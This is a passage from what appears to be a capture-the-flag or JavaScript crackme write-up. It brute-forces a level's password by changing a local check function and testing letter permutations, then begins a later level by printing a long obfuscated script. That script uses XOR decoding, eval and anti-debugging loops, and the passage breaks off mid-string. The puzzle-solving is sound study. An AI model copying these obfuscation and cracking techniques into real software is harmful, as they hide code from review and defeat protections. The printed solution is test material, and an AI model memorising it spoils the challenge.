<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">50     Number.prototype.valueOf   = a1;
51     Number.prototype.toString  = a2;
52     Array.prototype.valueOf    = a3;
53     Array.prototype.toString   = a4;
54     Object.prototype.valueOf   = a5;
</code></pre></div><p>Then you&rsquo;ll have some conditional testing:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">57     var m = a === b &amp;&amp; b === c &amp;&amp; c === d &amp;&amp; d === e &amp;&amp; e === f &amp;&amp; f === g &amp;&amp; g === h &amp;&amp; h === ii &amp;&amp; ii === j &amp;&amp; j === kk &amp;&amp; kk === l;
</code></pre></div><p>The <code>===</code> operator will return true if the two operands have the same values and also the same type. As we can see <code>a</code> and <code>b</code> must be from the
same type and have the same value. The same applies to <code>b</code> and <code>c</code>, <code>c</code> and <code>d</code> and so on. At the end the script will check if every single
character in the supplied password/key is different from the other ones:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">59     var n = password[0] != password[1] &amp;&amp; password[2] != password[3] &amp;&amp; password[4] != password[5]  &amp;&amp; password[6] != password[7]  &amp;&amp; password[8] != password[9] &amp;&amp; password[10] != password[11]
</code></pre></div><h3 id="bruteforce">Bruteforce</h3>
<p>I think the most naive approach is the bruteforce one. As an alphabet I&rsquo;ll use <code>abcdefghijklmnopqrstuvwxyz</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">var array1 = &#39;abcdefghijklmnopqrstuvwxyz&#39;.split()
var array2 = &#39;abcdefghijklmnopqrstuvwxyz&#39;.split()
</code></pre></div><p>Now we need to find all possible permutations (of 2 characters) between <code>array1</code> and <code>array2</code>:</p>
<ul>
<li>aa</li>
<li>ab</li>
<li>ac</li>
<li>..</li>
<li>da</li>
<li>db</li>
<li>..</li>
<li>zz</li>
</ul>
<h4 id="bruteforce-a-and-b">Bruteforce a and b</h4>
<p>In order to find out for which combination <code>a === b</code>, we&rsquo;ll have to generate all permutations between <code>array1</code> and <code>array2</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">function allPossibleCases(arr) {
    if (arr.length == 1) {
      return arr[0];
    } else {
      var result = [];
      var allCasesOfRest = allPossibleCases(arr.slice(1));  // recur with the rest of array
      for (var i = 0; i &lt; allCasesOfRest.length; i++) {
        for (var j = 0; j &lt; arr[0].length; j++) {
          result.push(arr[0][j] + allCasesOfRest[i]);
        }
      }
      return result;
    } 
}

var array1 = &#39;abcdefghijklmnopqrstuvwxyz&#39;.split(&#39;&#39;);
var array2 = &#39;abcdefghijklmnopqrstuvwxyz&#39;.split(&#39;&#39;);
var tmp_array = [array1, array2];
var perms = allPossibleCases(tmp_array);
</code></pre></div><p>Next we can call <code>check_password</code> with every permutation. However, you&rsquo;ll have to make sure that only <code>a === b</code> is being checked:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">[...]

// var m = a === b &amp;&amp; b === c &amp;&amp; c === d &amp;&amp; d === e &amp;&amp; e === f &amp;&amp; f === g &amp;&amp; g === h &amp;&amp; h === ii &amp;&amp; ii === j &amp;&amp; j == kk &amp;&amp; kk == l;
var m = a === b;

return m

[...]
</code></pre></div><p>Now we can bruteforce:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">for (var i = 0; i &lt; perms.length; i++) {
      var ret = check_password(perms[i] + &#34;aaaaaaaaaaaa&#34;);
      if (ret) {
          console.log(perms[i]);
      }
}
</code></pre></div><p>And the result was: <code>dk</code>.</p>
<h4 id="bruteforce-c">Bruteforce c</h4>
<p>In order to calculate <code>b</code> and <code>c</code> we need the permutations between <code>dk</code> and every single character in the alphabet:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">[...]
var allArrays = [[&#39;dk&#39;], array2];
  
var perms = []                                                                                                                                     
var perms = allPossibleCases(allArrays);
</code></pre></div><p>Again the <code>check_password</code> function has to be adapated:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">// var m = a === b &amp;&amp; b === c &amp;&amp; c === d &amp;&amp; d === e &amp;&amp; e === f &amp;&amp; f === g &amp;&amp; g === h &amp;&amp; h === ii &amp;&amp; ii === j &amp;&amp; j == kk &amp;&amp; kk == l;
var m = a === b &amp;&amp; b === c;
</code></pre></div><p>After running:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">for (var i = 0; i &lt; perms.length; i++) {
      var ret = check_password(perms[i] + &#34;aaaaaaaaaaaa&#34;);                                                                                           
      if (ret) {
          console.log(perms[i]);
      }
  }
</code></pre></div><p>The result was <code>dkq</code>.</p>
<h4 id="bruteforce-d">Bruteforce d</h4>
<p>We repeat the the previous steps:</p>
<ul>
<li>generate all permutations between <code>dkq</code> and every single character in the alphabet</li>
<li>adapt <code>check_password</code> to return <code>a === b &amp;&amp; b === c &amp;&amp; c === d</code></li>
</ul>
<p>And the results were: <code>dkqa</code> and <code>dkqs</code> (pay attention that both combination were valid; actually there were several more).</p>
<p>Since we got multiple results I had to change the code a little bit:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">var perms = [];

for (var i =0; i &lt; array1.length; i++) {
     for (var j = 0; j &lt; array1.length; j++) {
          p = &#39;dk&#39; + array1[i] + array1[j];
          perms.push(p);
      }
}
</code></pre></div><p>This time the result was: <code>dklj</code>.</p>
<h4 id="bruteforce-e">Bruteforce e</h4>
<p>The calculation of <code>e</code> differs from the previous ones:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">var e  = (tmp[ [] ] * tmp[ [] ] * 7777 + tmp[ &#34;&#34; + { &#34;wtf&#34;: &#34;a&#34; } ]) / (tmp[ &#34;&#34; + { &#34;wtf&#34;: password[7] } ] - tmp[ [] ]);
</code></pre></div><p>For the previous values <code>a</code>, <code>b</code>, <code>c</code> and <code>d</code> were calculated using <code>password[0]</code>, <code>password[1]</code>, <code>password[2]</code> and <code>password[3]</code>.
However, <code>e</code> is calculated using <code>password[7]</code> and <strong>not</strong> <code>password[4]</code> as we would expect.  Therefore the javascript has to be
slightly adapated:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">for (var i =0; i &lt; array1.length; i++) {                                                                                                           
    for (var j = 0; j &lt; array1.length; j++) {
         p = &#39;dklj&#39; + &#39;XXX&#39; + array1[i];
         perms.push(p);
     }
}
</code></pre></div><p>As you can see the first 4 characters are already known: <code>dklj</code>. The next 3 ones (<code>password[4]</code>, <code>password[5]</code>, <code>password[6]</code>) are
still unknown. So we need to find the 7th one (<code>password[7]</code>). And the result is: <code>dkljXXXj</code>. So <code>password[7]</code> has to be <code>j</code>.</p>
<h4 id="bruteforce-f">Bruteforce f</h4>
<p>This time <code>password[5]</code> is required:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">for (var i =0; i &lt; array1.length; i++) {
     for (var j = 0; j &lt; array1.length; j++) {
          p = &#39;dklj&#39; + &#39;X&#39; + array1[i] + &#39;X&#39; + &#39;j&#39;;                                                                                                  
          perms.push(p);
      }
  }
</code></pre></div><p>And the result is: <code>dkljXuXj</code>. So <code>password[5]</code> has to be <code>u</code>.</p>
<h3 id="final-result">Final result</h3>
<p>Using this I was able to get 2 final results: <code>dkljtugjpfrw</code> and <code>dkljtugjpfww</code>. Since every single character has to be unique, the password is: <code>dkljtugjpfww</code>.</p>
<h2 id="level-9-beauty-and-the-beast">Level 9: Beauty and the beast</h2>
<p>This challenge looks like hell:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">var c8i=(function B(t,n){var E=&#39;&#39;,D=decodeURIComponent(&#34;%09H%5D%067NI%08Y%7Bi%1E%2C%14%1E%12%3DfNI%3E4Y%5D9%0A%25%117%06%0F%0AoUp%08%1A8%1D%10%3C0%0Fp1y%1Aq%07%16%1B%5D6%06Y%1A%5B%3F6%01%06%0D%176&#39;5%12%12*2O%0CV%5C%22%16%1A%0A%1F%06%3C%17rGL-%00%00&#39;%26%03_%22y%1Aq%1E%15%1DM0%3D%03%0AIi%22%1C-%1F%1F%0F%3B%3F%06KtxdU%1D&#39;%3C%13HEU1%08%25%3D6X%023%00%0E%2FRL%1E%19E%12C%17*d%11%2F%1E%01%18%16%0B!%15R%25O%0E%06%11*r%1AMk%26%11%19I(2WCm%0D%2B%18%06eCm%0D%0F6B%18oj84&#39;*d%11%2F%1E%03%18%0B%04)%15%09%24M%0E%06%15*%23rKs%261%1F%3F04%10%5D.%3A%157%05%04%14%60.%08Bml%1Ej%3C5%5E-C%0E.%16kO%0B%0CNeD%1A%09%3B)%0D%1B%3Dz%1A%0E%1F%1A&#39;%06%04%1D%02%00%3DEbU%1E6%08o%7Fj%03_!%20N%00%0EH%5D%064%02%15Z%1Ck%7BL(%09%0A%03&#39;.%5E%5Bf5BB%13%0C%23_XW40%1A%3C%11%2F7%0F%3B%1C%1C%18(p%17%1Au%00%26&#39;%3Et%10-%26y(%1A%16%3C%0D%255%2F%1B%1F%5E%5Bf4S%40%16%03&#39;%06HEU3!%25%20W%5Eg%08o%7Fj6_yi%08!%09%02%18_4%06%0ADY%7Bi%5CuVG%13%26%3F%106%3F%23XDFNz%3F%5B(03%00%245_%0Fw3%24%3C%3A1m%01%18My%15%1B-O%7B%11%3Ej%12%0A%2CA4!%25%22%08!W%0A%041DlU%5Eh%5D%2FI6DoUp0.*2xoxTR%20%2CZsDJ%01W%22NI%08%03%3B8%1D%3BFUX1%3F%00%02%3F!SBFNz%13%06%06%1F%00&#39;%00%3E%0ENuQ%13oxTP)%20D%3BTXOf%09ZMj%16%2B%0B!%60P%25OqfNI%2B3TC%0E%10-%0D%13&#34;);for(var o=0,Z=0;o&lt;D[&#34;length&#34;];o++,Z++){if(Z===n[&#34;length&#34;]){Z=0;}E+=String[&#34;fromCharCode&#34;](D[&#34;charCodeAt&#34;](o)^n[&#34;charCodeAt&#34;](Z));}var i=E.split(&#39;&lt;,&gt;&#39;);try{eval(i[39]);return function(){};}catch(p){try{(function(){}).constructor(i[39])();return function(){};}catch(O){}}if(i[38] in eval){return function(){};}var v=typeof window===i[6]&amp;&amp;typeof window[i[40]]!==i[11]?window:global,Z7=function(O){return new v[i[12]](i[41])[i[14]](O)?O[i[42]](1,O[i[3]]-1):O;};try{(function R7(O){if((i[2]+(O/O))[i[3]]!==1||O%20===0){(function(){}).constructor(i[37])();}else{debugger;}R7(++O);}(0))}catch(O){}var y=(function(O7){var N7=function(O,p,K,N){switch(O){case 0:return (p&amp;K)^(~p&amp;N);case 1:return p^K^N;case 2:return (p&amp;K)^(p&amp;N)^(K&amp;N);case 3:return p^K^N;}},k=function(O,p){return (O&lt;&lt;p)|(O&gt;&gt;&gt;(32-p));},R=function(O){var p=i[2],K;for(var N=7;N&gt;=0;N--){K=(O&gt;&gt;&gt;(N*4))&amp;0xf;p+=K[i[9]](16);}return p;},l7=function(O){var p=[];for(var K=O[i[3]]-1,N=0;K&gt;=0;K--){p[N++]=O[K];}return p;},v7=function(O){O=O[i[24]](new v[i[12]](i[25],i[26]),i[27]);var p=i[2];for(var K=0;K&lt;O[i[3]];K++){var N=O[i[5]](K);if(N&lt;128){p+=String[i[4]](N);}else if((N&gt;127)&amp;&amp;(N&lt;2048)){p+=String[i[4]]((N&gt;&gt;6)|192);p+=String[i[4]]((N&amp;63)|128);}else{p+=String[i[4]]((N&gt;&gt;12)|224);p+=String[i[4]](((N&gt;&gt;6)&amp;63)|128);p+=String[i[4]]((N&amp;63)|128);}}return p;},X=typeof v[i[28]]!=i[6]||new v[i[12]](i[29])[i[14]](v[i[28]][i[30]]),G=i[8]===typeof B&amp;&amp;new v[i[12]](i[31],i[26])[i[14]](B+i[2]),r=X,u=!new v[i[12]](i[27])[i[14]](B),K7=r?0x8f1bbcdc:0x10325476,Q=X?0xefcdab89:0x6ed9eba1,J=u,g7=J?0x6ed9eba1:0x98badcfe,W=G?0x98badcfe:0x8f1bbcdc,M=G?0x67452301:0x5a827999,z=u?0xc3d2e1f0:0x67452301,q=J?0x10325476:0xca62c1d6,I7=[r?(J?0x5a827999:M):z,G?(J?g7:0x5a827999):Q,G?(r?K7:W):0x5a827999,J?(G?0xca62c1d6:0x8f1bbcdc):q],V7=function(O,p){O=v7(p?O:O[i[24]](new v[i[12]](i[32],i[26]),i[2])+O[i[24]](new v[i[12]](i[33],i[26]),i[2]));O+=String[i[4]](0x80);var K=O[i[3]]/4+2;var N=Math[i[34]](K/16);var e=new Array(N);for(var I=0;I&lt;N;I++){e[I]=new Array(16);for(var L=0;L&lt;16;L++){e[I][L]=(O[i[5]](I*64+L*4)&lt;&lt;24)|(O[i[5]](I*64+L*4+1)&lt;&lt;16)|(O[i[5]](I*64+L*4+2)&lt;&lt;8)|(O[i[5]](I*64+L*4+3));}}var P=false,Y=false;if(typeof v[i[16]]===i[6]&amp;&amp;v[i[16]][i[17]]&amp;&amp;((typeof v[i[16]][i[18]][i[9]]===i[8]&amp;&amp;v[i[16]][i[18]][i[9]]()[i[19]](i[20])!==-1)||typeof v[i[16]][i[21]](1)===i[22])){P=true;}if(!u){Y=true;}e[N-1][P&amp;&amp;Y?13:14]=((O[i[3]]-1)*8)/Math[i[35]](2,32);e[N-1][P?15:14]=Math[i[36]](e[N-1][14]);e[N-1][Y?14:15]=((O[i[3]]-1)*8)&amp;0xffffffff;var H=Q;var S=q;var m=W;var d=M;var f=z;if(typeof v[i[28]]==i[6]&amp;&amp;!new v[i[12]](i[29])[i[14]](v[i[28]][i[30]])){f=Q;d=W;S=M;m=z;H=q;}var F=new Array(80);var j,s,C,c,A;for(var I=0;I&lt;N;I++){for(var g=0;g&lt;16;g++)F[g]=e[I][g];for(var g=16;g&lt;80;g++)F[g]=k(F[g-3]^F[g-8]^F[g-14]^F[g-16],1);j=d;s=H;C=m;c=S;A=f;for(var g=0;g&lt;80;g++){var T=Math[i[36]](g/20);var p7=(k(j,5)+N7(T,s,C,c)+A+I7[T]+F[g])&amp;0xffffffff;A=c;c=C;C=k(s,30);s=j;j=p7;}d=(d+j)&amp;0xffffffff;H=(H+s)&amp;0xffffffff;m=(m+C)&amp;0xffffffff;S=(S+c)&amp;0xffffffff;f=(f+A)&amp;0xffffffff;}if(typeof v[i[23]]!==i[11]){return R(m)+R(S)+R(d)+R(H)+R(f);}return R(d)+R(H)+R(m)+R(S)+R(f);};return {a:V7,b:O7};})(B);try{var w=i[2];if(typeof v[i[16]]===i[6]&amp;&amp;v[i[16]][i[17]]&amp;&amp;((typeof v[i[16]][i[18]][i[9]]===i[8]&amp;&amp;v[i[16]][i[18]][i[9]]()[i[19]](i[20])!==-1)||typeof v[i[16]][i[21]](1)===i[22])){return function(){};}if(typeof v[i[23]]!==i[11]){throw i[2];}}catch(O){return function(){};}try{/Array.constructor.constructor/;if(!new v[i[12]](i[13])[i[14]](String.prototype.charCodeAt+i[2])||!new v[i[12]](i[15])[i[14]](String[i[4]]+i[2])){return function(){};}}catch(O){return function(){};}try{var x=0,U=23,l=[];l[x]=y[i[0]](Z7(y[i[1]]+i[2]))+i[2];var i7=l[x][i[3]];for(var o=t[i[3]]-1,Z=0;o&gt;=0;o--,Z++){if(Z===i7){Z=0;if(++x===U){x=0;}if(l[i[3]]&lt;U){l[x]=y[i[0]](l[x-1],l[x-1])+i[2];}i7=l[x][i[3]];}w=String[i[4]](t[i[5]](o)^l[x][i[5]](Z))+w;}var V=(0,eval)(w);if(typeof V===i[6]){for(var h in V){if(V[i[7]](h)&amp;&amp;typeof V[h]===i[8]){V[h][i[9]]=V[h][i[10]]=function(){return i[2];};}}}(function x7(O){if(typeof O===i[6]){for(var p in O){if(O[i[7]](p)){if(typeof O[p]===i[8]){O[p][i[9]]=O[p][i[10]]=function(){return i[2];};}else if(typeof O[p]===i[6]){x7(O[p]);}}}}})(V);if(typeof V!==i[11])V[i[9]]=V[i[10]]=function(){return i[2];};return V;}catch(O){return function(){};}})(decodeURIComponent(&#34;%10T%14W%00G%5B%0B%0C%10%18%18%11%02y%7B%07M~%00%5C%1EC%2C%03kf1%5BCyu%2C%01%7C%02%17J%14aa%02%7C%2BnXZ%07u%00E%13q%05%00qamZFmX%10%3Cch%242XY%5D%1F%01%3B%0DW%05%05a%5BQv%08U0%24Xw%0FQ%2BQiG%5C~%16%7FfAS%3AMY%20_%5C%09ONEq%7B%03%60%00N%5EHS%07v%5B%11F~yR4w%20Gf%5E%01%0DU%04%0EF%0AS%04cyWZ%17%17%7Fe%1E%01%07q%20%03Vq%40ZtS%22ZA%3A!O%2C%0F%02%0Cu%05R%05~%026jX%11QvFY-%0DNQ&#39;FP%26&#39;F%07A%0C%1AQF%0BQDZ%0C%0A%1E%18%1E%18%15%13%15%02%16%5CTFYV%5CB%07N%1A%1A%17%19%14EB%19AB%11%08H%5DE%00U%18%10%11%11UM%5CWLPWY%11U%1CJ%1E_FZ%00%15X%0EX%11T%18%18%1F%40%1Dn%17%10%15%14%19%19CCD%19FE%17CGM%18NC%1C%17%18kE%19BB%14%12%11%16%14%12EC%19A%16CD%1A%03BWRM%5E%0C%08%13Q%19%08M%10L%1B%1A3%12C%13C%17%13B%16%19%12%15%15%16%15%14%14%10%15%10%18%10YVM%1DDB%1D%1A%0BMZ%1F%1C%16T%5D%08%05L%5C%17%16%5B_%11%08E%1E%1EEZB%15F%02%08%10%5E%0D%0A%18%03%1AC%19A%13n%17%18%12A%11%18%12%17%12%15%11%11C%11%10FDF%10%15EA%15E%17%19%04EXU%16%0A%5CY%1BLKN%18%19RW%5B%11CFG%00GY%13%1F%15WWSM%05%05RA%17%1FJ%18%09%40%1A%3B%14F%18DA%16%18%11%11F%17E%10%17F%19A%13%10B%16HEUYD%07BK%16%1F3%19EF%11B%11%10F%11F%11F%12%15%17%12%19%12%17D%11%11%14%18%17S%06R%11%02%04%04F%03%13HiD%19CC%18%18%17B%17%18%14F%15C%17EFD%16%13%10JDO2%17%17%19CD%13%12F%19%16BEC%11%15F%13F%10%12%13S%11IM%5B%1F%5E%10%1AoB%14C%19%10%18%16E%10%16%15%14D%17%19%15FK%1F%09M%1ED%1BiF%18D%16%15C%13%15%13%15%17%10FL%10%02WFQ%0CJP%1F%13%1E%07HD%07B2Q%5BP%0C%10%15%11%03%15%12%0D%02%07%06%1AN%1A%19%3B%16%11AE%13%13%13E%1BH%1CM%1EM%1F%19R%09PF%08U%5B%15O%00%0DU%40JVII%5C%0DTu%0D%0F%0AQ%11%07%09U%10Y%5C%5CBHRE%04%03%12%03%26%08%04%5DQ%0BD%1AA%04%16%04Z%03%15%19%1BK%07X%0BM%5C%0B%162%5E_WY%15K%0F%16HXD%13%13FH%03BFFE%40%17A%14%1D%15%12%13%19%14B%16%0F_%17%10%16I%16%5C%0E%5EBCX%5C%02V%12A%04Y%08B%12%5E%01%5E%5CZ%15%11F%1F%13%19ANC%07Z%04%10B%0FZ%01%0B%40%16Q%0AU%17LC%0A%5E%0EE%1F_L%0D%01FQW%5C%1E%19BH%14%16%13BF%11%12B%13FQ%00%1E%15%1E%07B_%1F%0D%11XRI%0A%15WRMXH%0D%5C%0BP%16Y%1E%16%07%40%10%1C%5BVGYS%00F%0E%17%1A%14%5CW%16%07%5DGU%1BH%19%18%13%12DB%18%11C%16%13%17%12%12%14%13%0FTL%5D%0BUD%5B%03%5ED%1BQ%0ASM%18BBD%10%13%14%11B%14%13%17F%19%12%12D%14D%10%10R%1F%1A%08%17%14BF%15%18FE%14%12%16F%18A%19%13P%5BDT%15NA%14BE%19%14FFAC%10%12%13%13B%18%11%13B%0A%5BP%0EC%1C%5EVTYVU%12%09EX%08%18%17%11%13%11D%15%12%18CE%12B%17O%11%18E%14E%16%14F%12AJ%12%14%14FF%12%10%1B%13%12%19E%1C%14VRAT%0BK%06%1EB%1FK%18J%1EK%0F%11T%17%40F%0D%12OEE%06%11%0B%03MW%5B%17_%0C%0DJ%7D%1C%16%1EIEV%11GB%5DC%2B%08%0F%5BH%0EN%3FHDf%0E%15%0A%1Bm%09DJ%14%18%0Fv%13_%40P%0F%11MY%0A%5BVC%15%16Q%07%1E%09%5EGZ%5BMQXW%1Bz%1DF%10HF%06%15D%13X%11z%0CA_%1F%3CH%10Z%02%13%03_%16%0D%07M%0F%0A%5B%1F%1COK%40%07Q%5E%40%3APd_%11ATW_LiU%3E%13%12C%05%00%5B%1Dl%08l%02JiJ%14b%05F%5EVBWRM%5B%0C%5DKx%1F%12%1FB%40PACGZ%14%7F%09%0CH%09M%3AI%12%19R%11%08%04%17%5DUAQWVN-%14D%1EL%14%07EL%17%0CB*O%12%0B%1B%3A%14%17%20%09%10%02%11qANDZU%10%02%03Q%1D%1FJ%06%15%0F%00%04O%16wVC%5CV%40%0B%02A%0CZ_J%7F%1AFK%18ARG%10B%5D%11xMH%0E%1F%3D%18%15%1B%05%11%5BQG%5DQEQ%0D%0C%1F%7C%1CFKJ%40%07EDF%08%18%2B%5DF%03L%3BJ%10%0D%08xA%03C_%5B%15X%5EG%1C%12GQE%0ARAWZ%11%0F%5E%0C%19%7FJAOJ%14WAB%40W%12xY%0CA%0FE%3F%1BDdS*D%5B%16KT%00%0C%0A%5D1%0CMVS%40%1B%1FyP%12YQ%10%08%07BZ%5DYN%2B%14G%1EB%11%01GG%14W%16-Y%13%0AHl%1FAF%00%16%0B_%17%08QB%0C%5D_M-%18%13%10KJS%11ED%5B%14%2B%1AI%0E%19%3C%1B%1E%3C%05A%0A%05%13V%07B%5C%0C%5D%1D%7C%19G%19%1FCU%15C%40%5CD-%0B%0BC%5E%1Cl%1BEPR%1F%0CS%16%0B%02M%0BV%5C%10%7D%1BF%1AHJWECC%0FE%7C%19C%5ED%3F%19BY%07y%16%0CA%0E%14I%17VTFX%04DW%07CPVWK%7F%1A%15J(%1CB%11%03B%10FW%12yX%0F%09%11%5EZ(X%19k%1C%13-%06%15%5C%04%11%0BT%12%5B_%5CM%2B%1B%15%10B%17%07%11BC%5D%16-%5C%0A%0A%11X%199%1FAo%08E%5C%00%10Z%06L%5D%09%5B%1A%7C%15DKM%14%5CCM%10%5EFv%5DHYI%3B%1EA%7BW.%1E%5E%175ZC%07uKK%00OD%15%12R%02x%14X%17%10QBD%18B2%0F%1F%0A%00E%0B%5B%17%5E%0C%5DMw%15IJ%19%40%5DLGK%5EB%7CHF%08%1Fl%1D%15-%01)%1F%5C%14kU%07DSAHFm%0E%12Y%03MXREQ%0A%5DMz%15%40%19%19%10V%10AGY%11%7F%09%5C%0F%11%5EIn%1C%11%25W%15%0F%5EG%0FZ%17Z%5D%0AJw%1D%13%1FHEWFAA%08%12%2B%07Z%08A%0D%1B%3A%1C%12%60Q%10%0EW%17W%07DZ%5B_J%7B%1FGOB%40W%10A%16%5E%10%7C%16%0EC%0CIhJ%12RQ*%13%08P%07T%12%01%1F%12V%07%16%0FS%14Z%01%11P%5B%08N.O%40%1BHA%07LDA%5BCz%0A%11%0FO%3B%14%1F%5E%02%16%08R%10WPL%5E%5E%5D%19%2B%19B%11%18%17W%16B%40_%18*%1E%15%0DIl%1EFB%00%13%0E%00%13%5CS%12Z%5DWM.%18E%1ANE%06%17%16E%0CDyX%5E%0B%12%0F%1E%3BO%12%5CU%15%0E%04G%5EUE%0CWW%10%2C%1A%13J%19%40U%12B%40Y%13*%0E%0CCX%19%3C%1DB~%02%7C%12%5EAy%04%10%1C%1EhU)A%09CBJQ%17%23%5E%04%0CM%1AH%1FkR%1E%0B%0B%01%15%14i%01%13%02%08%14%10z%03%12%0BPL%5DW%17%08%5E%0F%1E~%19%40%18%1F%10S%10BB%5B%14vE%13X%193JB%60%02%12%0E%5E%40%0FTCQ%0E%0B%11-ND%1BJDQF%10%11WAy%5E%5BB%5EJ3%1D%1EXSA%09UD%0F%07D%5EV_%11%7DOCJLA%07BL%40%5B%15yID%0FM%3F%1C%1FB%01%17_%0DOBB%00EXUC%5B%5BLQ%09%0C%10%7B%1BGO%19C%5C%11%17%10%0B%13-%0E%5B%40%03Mi%1C%10z%0B%14Y%04%16V%07CQ%5D%0F%19w%1EG%1BNCT%17DB%08D)%16E%5E%1C%3FI%12~R%17%0CP%17%0DPCZ%0A%5E%1B~%1BA%11N%10R%40G%11%5D%16.%18B%08O%3B%14E%2F%00%7C%17%0C%40F%5D%10UB%16J%1F5Y%11%02WD%08T%11YX%08%11.%1F%40KOG%00D%40E%0CB%7F%0A%09I%02%18l%1DEB%03A%0BD%02%0AY%01%04%5ER%06%04F%1D%16q%0C%12%0D%05E%0A%06%17%08%5BV%19%2CO%14%10%18%11%5DLB%10Y%18%7BX%0B%5DG%5E%1Bn%1A%14x%00A%5E%5EBYZ%17%0D%5C%5CNv%1A%12L%18CP%12F%14%5E%12~%0DIY%1B8%1AB~%02BX%16A%15%17b%0FB%0A%14V%5C%01TRs%0DDDMF%1BA%7C%5B)%1F%5E%14R%06G%17%1F%12b%00C%0BV%14XQF%0D%0D%5B%1E%7CI%11OL%10S%12MD%5BC*LIYD8%14%15n%06%14%09%5EG_UE%08%0A%5D%1B%7CII%1CN%17RDCCXF%7CO%15%0BHkME2%03%1E%5EQLWZ%17YY%0BN)%19IJ%1DD%00%40L%40XF~%11%11Y%1BlOC%16%00%13_VG%08%01%10%0CX%08%1A%7F%1E%15HyLBK%00%16%10E_%13y%3C%12jzZ%1En%1F%14%00%07wE%5CD%0CY%15WF%12%17%1E%14P%03-%11%5C%0D%05%01V%09P%0ES%01T%18%16DQvB%5B%1B%07Y%0D%5BTA%18%1ENR%11%5C%1B_V%5CY%11N%126%03%12%5C%01ICS%08%17%5CV%10V%00C%0A%5C%0B%10v%15%13KIJ%5DFLB%0C%13%7BJCY%1B%3B%1EEqA%02%00CZR%12Y%5D%0DL.%10Ms%0F%04K%5EuTL%00P%11n%1Bzc%3D0v(qtdt%12i%5C%7DZ%18%3EH%17bVF%08SM%5C%02M%0A%5C%5CL-%14AJMARFGF%5DF%7DXI_K%3B%1AAu%05%12%09%03BZR%16P%0B%5E%1B%7B%1D%12%1DHE%03MG%40%0A%14%2B%0D%0DC%0CN9%1B%13%10R%12%02%00%10ZQB%0FW%0FL%7C%19G%1EJGP%15A%10%0B%19%7BXX_%13%0BO9%1FEJ%06%14%0F%05%40Z%02%40%5B%5EV%10y%1BA%1BO%17%5CGME_%13~XE%09EiI%15)%0F%7D%16%02GQ%1DBQ%08VC%1B%15x%0CA%5CTE%08PFP%0A%0F%1Cz%1FE%1E%18%11%06C%17%16XE%2CJ%12%0F%1E%3BO%12xU%15%0E%04G%5EUE%0CWW%10%2C%1A%13J%19%40U%12B%40Y%13*%14%40%08%1En%1A%16%14%0A%12%09S%11%0DQC%5B_W%1A-J%16%1A%1AE%5C%40%10%10WA-%04%05%14%03Nk%15%16%7B%05%1E%09%5EGZ%5BMQXW%1Bz%1DF%10HF%06%15D%13X%11z%0CA_%1F%3CH%10R%01%13%03_%16%0D%07M%0F%0A%5B%1Fz%18H%1C%1AERL%14%17WB-%08B%0AK%3E%1EB3%0AF%0CQR%1EBS%0F%16%03Q%16%08PGX%0E%0A%18x%15A%10I%11V%17BA%0C%16v%14E%0EK%3F%18%13u%02%17%02TE%5E%06A%0A%0AX%1A-NC%1FNJ%5DL%13%10V%14xK%16YL3IE%0EQ%14XV%13%5E%5BD%0A_Y%10%7C%1F%13K%18J%01CM%40%0F%11w%0CG%09H%3B%1DDr%08A%5E%00E%5B%06%15%5C%0A%5B%19-%1CF%1A%2CJHEV%11EA_%17~DE%1Ey%0FOi%1F%11%23%06%15%09%10RP%03%10t%5CTS%23E%10N%16Z%06A%02%02%14X%5BEX%09YM%7F%1B%16%10%1AAU%16AG%0B%10z%11%12YM%3E%18%1E%5DWA%0B%04D%5E%05E%0F%5E%08%1Az%1BB%10IE%01EDFV%15xF%40_%18iM%13%7D%02DYP%15D6%0F%1F%0D%04BVW%12%5C%0CYM)HF%1AIE%03%10MEY%19%2C%18C%09%1B3%1AE%0FR%16%0FDl%08tSEP%7B%1B%12WEG%1E%16%02Z%7BD%03%5EMZ%09%1C%11M%0CC%0D_%40%0AUCP%0BYN%7FO%16%11%1FDP%17FG%5D%15xL%14%0AMk%1A%15SRE%0FPF%0B%02%12%5E%0DXNw%1AEJ%1E%13%5C%16L%40V%12x%0AC%08E8%1